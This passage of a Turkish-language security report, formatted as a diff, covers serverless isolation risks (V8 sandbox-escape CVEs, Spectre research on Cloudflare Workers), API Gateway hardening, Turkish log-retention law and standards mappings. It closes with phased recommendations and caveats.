+- **"A systematic review on security mechanisms for serverless computing"** (Cluster Computing, Springer 2025, DOI 10.1007/s10586-025-05371-4): "Warm containers, designed to reduce startup latency, exacerbate these vulnerabilities by potentially leaking state between executions, opening opportunities for side-channel attacks."
+
+**Side-channel / Spectre saldırıları:** Paylaşılan süreç modelinde "shared fate" sorunu vardır: Worker'ınız aynı edge node'da başka müşterilerin Worker'larıyla V8 sürecini paylaşır; herhangi bir tenant tarafından exploit edilen bir zero-day V8 açığı, kodunuz kusursuz olsa bile verinizi etkileyebilir.
+
+**Belgelenmiş V8 sandbox-escape CVE'leri (JIT/type confusion):**
+- **CVE-2024-2887** — V8/WebAssembly type confusion (CWE-843); Manfred Paul'ün Pwn2Own 2024 "Master of Pwn" kazanan exploit zinciri. ZDI yazısı V8 bellek sandbox'ından kaçışı açıkça tarif eder ("a bug that can be used to escape the memory sandbox"). Chrome Stable 26 Mart 2024'te yamalandı.
+- **CVE-2025-5419** — V8 Turbofan JIT optimizasyon hattında type confusion → out-of-bounds okuma/yazma, sandbox escape. Google Project Zero tarafından keşfedildi (kritik aralıkta; kesin CVSS NVD'den teyit edilmeli).
+- **CVE-2024-5274** — V8 type confusion RCE; NVD: "Type Confusion in V8 in Google Chrome prior to 125.0.6422.112 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page" (28 Mayıs 2024, CISA KEV listesinde).
+- **CVE-2025-13223** — V8/WebAssembly type confusion zero-day (CVSS 8.8), Google TAG'den Clément Lecigne bildirdi; vahşi doğada aktif istismar edildi (2025'in yedinci Chrome zero-day'i).
+
+Bu CVE'ler, V8'in saldırı yüzeyinin neden geniş olduğunu gösterir; Google V8 sandbox escape için beş haneli ödüller dağıtır.
+
+**Akademik araştırma — Cloudflare Workers'a doğrudan Spectre:** Schwarzl, Canella, Gruss, Schwarz (Graz Üniversitesi), "Robust and Scalable Process Isolation against Spectre in the Cloud" / "Dynamic Process Isolation" (ESORICS 2022; arXiv 2110.04751). Cloudflare Workers üzerinde harici zaman sunucusu kullanan amplified Spectre saldırısıyla **2 bit/dakika** hızında sır çalmanın mümkün olduğunu kanıtladılar — "language-level isolation is insufficient" sonucuyla. Fastly'nin WebAssembly dil-seviyesi yalıtımı da aynı-süreç Spectre saldırılarını dikkate almak zorundadır. Daha geniş ölçekte, Zhao, Morrison, Fletcher, Torrellas, **"Everywhere All at Once: Co-Location Attacks on Public Cloud FaaS"** (ASPLOS 2024, DOI 10.1145/3617232.3624867) FaaS ortamlarında saldırganın en az bir kurban örneğiyle %100 olasılıkla co-location sağlayabildiğini ve Google Cloud Run'da LLC Prime+Probe yan-kanal saldırısını uçtan uca çalıştırdığını gösterir.
+
+**Cloudflare'ın Spectre karşı savunması (kendi mühendislik blogu/dokümanları):** Workers runtime'ı kodun kendi yürütme süresini ölçmesini imkânsız kılacak şekilde tasarlanmıştır — resmi dokümandan: "the value returned by Date.now() is locked in place while code is executing. No other timers are provided. Moreover, Cloudflare provides no access to concurrency (for example, multi-threading), as it could allow attackers to construct ad hoc timers." **Dynamic Process Isolation** (Graz ile ortak araştırma, üretimde): donanım performans sayaçlarıyla saldırı belirtisi gösteren Worker'lar kendi süreçlerine yeniden zamanlanır; "Out of many thousands of Workers running on our platform, we see only about 20 being falsely detected as attacks." Cloudflare kendi POC'unda Spectre v1 ile ~120 bit/saat sızıntı elde edebildiklerini dürüstçe belirtir ve süreç yalıtımının "tam bir savunma olmadığını", Workers'ın "tüm CPU-tabanlı sistemler gibi gelecekteki bilinmeyen saldırılara açık" kaldığını kabul eder. *Not: MPK/Memory Protection Keys'in Workers'ta kullanıldığı bazı ikincil kaynaklarda iddia edilse de Cloudflare birincil kaynağıyla net biçimde teyit edilemedi.*
+
+### 10.3.3. Dağıtık Serverless'te API Gateway Güvenliği ve Veri Akışı Yönetişimi
+
+Dağıtık serverless mimaride API Gateway, kimlik doğrulama, rate limiting, WAF filtreleme ve mTLS'i tek bir merkezi noktada uygular — "doğru yapıldığında tek bir istek bile uygulama koduna ulaşmadan önce işlenir; yanlış yapıldığında her şeyi geçirir ve servislerin başının çaresine bakmasını bekler."
+
+**AWS API Gateway desenleri:**
+- **Kimlik doğrulama:** IAM auth, Cognito User Pools veya Lambda Authorizers. HTTP API JWT authorizer, JWT imza/expiry/issuer/audience'ı kod yazmadan doğrular:
+```yaml
+MyJWTAuthorizer:
+  JwtConfiguration:
+    issuer: https://your-issuer.auth0.com/
+    audience:
+      - https://api.example.com
+  IdentitySource: "$request.header.Authorization"
+```
+- **Authorizer caching** (5-300sn): aynı token'ı her istekte doğrulamayı önler (performans + maliyet).
+- **mTLS:** HTTP API'lerde native; CA bundle S3'e yüklenir, custom domain'de etkinleştirilir.
+- **Katmanlı rate limiting:** API Gateway throttling (server-side + per-client usage plans) + WAF rate-based rules (per-IP) + custom Lambda authorizer (per-user/per-tenant); CloudFront + CloudFront Functions KV-store ile edge'de daha erken throttling.
+
+**Mimari diyagram (tarif):** Holistik serverless güvenlik katmanları — *Cognito (kimlik) → CloudFront + AWS Shield (DDoS, 100+ edge lokasyon) → AWS WAF (XSS/SQLi/IP reputation/rate-based) → API Gateway (CORS, resource policy, request/schema validation, Lambda authorizer) → Lambda (Firecracker microVM) → DynamoDB/S3 (bucket policy ile tenant izolasyonu)*. WAF kutusunun "ilk değerlendirilen katman" olduğu, authorizer ve resource policy'den önce geldiği vurgulanır; sağ altta CloudWatch/X-Ray izleme akışı.
+
+**Azure API Management ve Cloudflare:** Azure APIM yerleşik JWT validation politikası sunar; Cloudflare ise gateway'i Workers ile global dağıtarak edge'de (kullanıcıya yakın) per-IP throttling'i basitleştirir. Kong (Nginx/OpenResty tabanlı, open source) çoklu-bulut/on-premise için plugin esnekliği sağlar. Gateway daima "fail closed" (aşırı yüklendiğinde isteği geçirmek yerine reddetmek) davranmalıdır.
+
+---
+
+## 10.4. Türkiye'ye Özgü Yasal ve Düzenleyici Yükümlülükler
+
+Uygulama güvenliği mimarisinin loglama ve veri koruma boyutu, Türkiye'de üç ana mevzuat çerçevesiyle iç içedir. Bir SOC analisti için bu yükümlülükler, log toplama/saklama mimarisini doğrudan şekillendirir.
+
+### 10.4.1. 5651 Sayılı Kanun (İnternet Ortamında Yapılan Yayınların Düzenlenmesi)
+
+23 Mayıs 2007'de Resmî Gazete'de (26530) yayımlanan kanun, erişim/yer/içerik sağlayıcılar ve toplu kullanım sağlayıcılara loglama yükümlülüğü getirir. Kurumsal ağlarda internet erişimi sağlayan her işletme "İnternet Toplu Kullanım Sağlayıcısı"dır. Erişim sağlayıcının temel yükümlülükleri:
+- Hukuka aykırı içeriğe erişimi engellemek (Madde 15/1-a).
+- Kullanıcı trafik bilgilerini **en az 1 yıl** saklamak ve bütünlüğünü sağlamak (Madde 15/1-b).
+- Faaliyet sonlandırmadan en az 3 ay önce BTK'ya bildirmek ve geçmiş 1 yıllık logları teslim etmek (Madde 15/1-c).
+- IP–kullanıcı eşlemesi (NAT logları dahil) ve dahili IP kayıtlarını tutmak.
+
+30 Kasım 2007 tarihli (26716) "İnternet Ortamında Yapılan Yayınların Düzenlenmesine Dair Usul ve Esaslar Hakkında Yönetmelik", "dosya bütünlük değerlerini **zaman damgası** ile birlikte saklamak ve gizliliğini temin etmek" yükümlülüğünü getirir. Zaman damgası, 5070 sayılı Kanun kapsamında tanımlanan zaman damgasına dayanmalı (TÜBİTAK KAMU SM gibi BTK-yetkili sağlayıcılardan). **Kritik nokta:** Sadece hash/kriptografik bütünlük yeterli değildir; yasal geçerli zaman damgası gerekir — aksi halde savcılık logları "şüpheli/geçersiz" sayabilir. Uyumsuzlukta BTK idari para cezası uygular ve adli vakalarda log sunamamak kurumu sorumlu duruma düşürür.
+
+### 10.4.2. KVKK (6698 Sayılı Kişisel Verilerin Korunması Kanunu)
+
+KVKK, log verilerinin kişisel veri içermesi durumunda işleme/saklama/imha yükümlülükleri getirir. **Önemli hukuki köprü:** 5651 kapsamında log tutmak, KVKK **m.5/2-a** ("Kanunlarda açıkça öngörülme") ve **m.5/2-ç** ("Veri sorumlusunun hukuki yükümlülüğü") kapsamına girer — bu veriler için açık rıza gerekmez, ancak şeffaf Aydınlatma Metni zorunludur. Veri minimizasyonu ve amaçla sınırlılık ilkeleri gereği gereksiz log toplanmamalı ve süresi dolunca imha edilmelidir (sonsuza dek saklama bir KVKK ihlalidir; veri silme loglarında 3 yıl/3+1 yıl pratiği vardır). SOC analistleri için **veri maskeleme** (IP/kimlik no son hanelerinin yıldızlanması) ve "Çift Yetki/Dual Control" (IT + hukuk onayı ile gerçek veriye erişim) pratikleri amaçla sınırlılığa uyumu sağlar. İhlal durumunda Kurum'a ve ilgili kişilere bildirim yükümlülüğü doğar.
+
+### 10.4.3. BDDK ve Sektörel Tebliğler
+
+- **BDDK "Finansal Kiralama, Faktoring ve Finansman Şirketlerinin Bilgi Sistemlerinin Yönetimine ve Denetimine İlişkin Tebliği":** denetim izleri (Madde 9/6) **asgari 3 yıl** denetime hazır tutulur ve yedeklenir; olası felaketler sonrası erişilebilir olmalıdır.
+- **TCMB "Ödeme ve Elektronik Para Kuruluşlarının Bilgi Sistemleri... Tebliği":** denetim izleri (Madde 13/2), gizliliği/bütünlüğü/güvenliği sağlanarak, yedekli ve zaman damgalı olarak **en az 10 yıl** saklanır; zaman damgası 5070 sayılı Kanun'a dayanır (Madde 25/5).
+- **SPK "Bilgi Sistemleri Yönetimi Tebliği":** denetim izleri (Madde 22/4) **asgari 5 yıl** saklanır; zaman bilgisi (Madde 23/1) tek referans kaynağına (atomik saat) göre senkronize edilir.
+- **Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Bilgi ve İletişim Güvenliği Rehberi (md. 3.1.8.x):** sistem iz kayıtları olay açıklaması, kaynağı, zamanı, kullanıcı/sistem bilgisi, kaynak/hedef adresleri ve işlem detaylarını içermeli; bütünlüğü zaman damgasıyla korunmalı; yedekli ve senkronize NTP sunucusu kullanılmalı.
+
+Bu yükümlülükler, uygulama güvenliği mimarisinde merkezi log yönetimi (SIEM — Wazuh, Logsign, FortiLogger vb.), zaman damgası entegrasyonu ve NTP senkronizasyonunun yalnızca teknik değil **yasal** gereklilikler olduğunu gösterir. ISO 27001 Annex A.12.4 (Logging and Monitoring: A.12.4.1-A.12.4.4) kontrolleri bu mevzuatla paralel çalışır. Bazı denetçiler (örn. SPK son 1 yılı, BDDK 3 yılı) logların "canlı/online" tutulmasını talep edebilir.
+
+---
+
+## 10.5. Uluslararası Standart Eşlemesi (Özet)
+
+| Konu | NIST | CIS Controls v8 | ISO 27001 | OWASP / MITRE |
+|---|---|---|---|---|
+| Güvenli SDLC | SP 800-218 (SSDF) | Kontrol 16 (16.1-16.14) | A.14 (Secure Dev) | SAMM, ASVS |
+| Olay müdahale | SP 800-61 | Kontrol 17 | A.16 | MITRE ATT&CK |
+| Erişim/sistem kontrolleri | SP 800-53 | Kontrol 5, 6 | A.9 | API Top 10 (BOLA/BFLA) |
+| Loglama/izleme | SP 800-92 | Kontrol 8 | A.12.4 | Top 10 A09 |
+| Tedarik zinciri | SP 800-218 / SP 800-161 | Kontrol 16.4-16.6 | A.15 | Top 10 A03 |
+
+CIS Control 16'nın Safeguard'ları somut, ölçülebilir hedefler verir: **16.4** (üçüncü-taraf bileşen envanteri), **16.5** (güncel ve güvenilir bileşenler), **16.6** (zafiyet severity rating sistemi + asgari kabul seviyesi), **16.7** (hardening şablonları), **16.8** (üretim/üretim-dışı ayrımı), **16.9** (geliştirici güvenli kodlama eğitimi), **16.10** (güvenli tasarım ilkeleri), **16.11** (vetted modüller). Bunlar OWASP Top 10:2025 A03 (Supply Chain) ve A06 (Insecure Design) ile doğrudan örtüşür. CIS, NIST/CSA/SAFECode/MITRE ATT&CK/OWASP'a açıkça atıf yapar.
+
+---
+
+## Öneriler
+
+1. **Hemen (0-30 gün):** OWASP Top 10:2025'e göre tarama kurallarını güncelleyin (Semgrep/SonarQube — A03 ve A10 yeni kategorileri dahil). CI/CD'de `grype --fail-on high` ve SBOM üretimini bloklayıcı kapı yapın. WAF'ı önce "executing/detection paranoia level 2, blocking level 1" ile detection modunda çalıştırıp yanlış pozitifleri toplayın. Türkiye'deki kurumlar için SIEM zaman damgası ve NTP senkronizasyonunu doğrulayın.
+2. **Kısa vade (30-90 gün):** SLSA Level 3 provenance (GitHub Actions OIDC + Cosign/Sigstore + Rekor) uygulayın. API Gateway'de BOLA için object-seviyesi yetkilendirme testleri (iki test hesabı yöntemi) ekleyin. GraphQL introspection'ı üretimde kapatın, query depth/complexity limitleri ve batching kontrolleri koyun. WAF anomaly threshold'u kademeli 5'e indirin.
+3. **Orta vade (90-180 gün):** OWASP Dependency-Track ile sürekli SBOM izleme + VEX ile yanlış pozitif bastırma; merkezi SIEM'i 5651/KVKK/BDDK/TCMB/SPK saklama süreleri ve 5070'e dayalı zaman damgasıyla yapılandırın. Serverless'te warm-container `/tmp/` hijyeni, secret rotasyonu ve (gerekiyorsa) execution environment yeniden kullanımını devre dışı bırakma politikası uygulayın. Tehdit modellemeyi (STRIDE/PASTA) tasarım sürecine kalıcı entegre edin.
+4. **Eşik değerleri (değişim tetikleyicileri):** Critical CVE → 24 saat, High → 7 gün remediation SLA. WAF inbound anomaly threshold = 5 (üretim, PL'e göre ayarlı). Rate limit: kimlik uçları 100/5dk-IP, genel 2000/5dk-IP. **Bu eşikler şu durumlarda yeniden ayarlanmalıdır:** yanlış pozitif oranı meşru trafiğin %1'ini aşarsa, iş akışı bozulursa, ya da yeni bir kritik tedarik zinciri kampanyası (örn. yeni Shai-Hulud dalgası) IOC'leri yayımlanırsa registry/proxy bloklama kuralları derhal güncellenmelidir.
+
+---
+
+## Caveatlar
+
+- OWASP Top 10:2025 yüzdeleri ve sıralamaları geçmiş veriye dayanır; A03 (Supply Chain) ve A09 (Logging) gibi kategoriler CVE verisinde düşük temsil edildiğinden topluluk anketiyle yükseltilmiştir — gerçek prevalans daha yüksek olabilir. Liste, sürekli/günlük dağıtım yapan ekiplerin haftalık tarama yapan AppSec ekipleriyle yapısal uyumsuzluğunu (her tarama arası bir maruz kalma penceresi) varsayar.
+- SolarWinds'te ~18.000 müşteri trojanlı sürümü indirmiş olsa da fiilen ele geçirilen sayı 100'den azdı (resmi SolarWinds açıklaması) — "18.000 ele geçirildi" yaygın bir hatadır.
+- Bazı V8 CVE CVSS skorları ikincil kaynaklardan derlenmiştir; üretim kararları öncesi NVD'den (nvd.nist.gov) doğrulanmalıdır. MPK'nin Cloudflare Workers'ta kullanıldığı birincil Cloudflare kaynağıyla teyit edilemedi.
+- Türk mevzuatındaki saklama süreleri tebliğ revizyonlarıyla değişebilir; canlı vs. arşiv log ayrımında bazı denetçiler tüm süreyi "canlı" isteyebilir. Güncel tebliğ metinleri ve KVKK kurul kararları doğrulanmalıdır.
+- Shai-Hulud kampanyası aktif ve evrilen bir tehdittir (Eylül 2025, Kasım 2025 V2, 2026'da "Mini Shai-Hulud" dalgaları dahil); paket/IOC listeleri sürekli güncellenmektedir ve etki rakamları ilk-saat tahminleridir.
+- Cloudflare'ın Spectre savunmaları güçlü ama mutlak değildir; Cloudflare'ın kendi beyanıyla süreç yalıtımı "tam bir savunma değildir" ve Workers gelecekteki bilinmeyen CPU-tabanlı saldırılara açıktır. Yüksek hassasiyetli/çok-tenantlı iş yükleri için Firecracker microVM (donanım yalıtımı) tercih edilebilir.
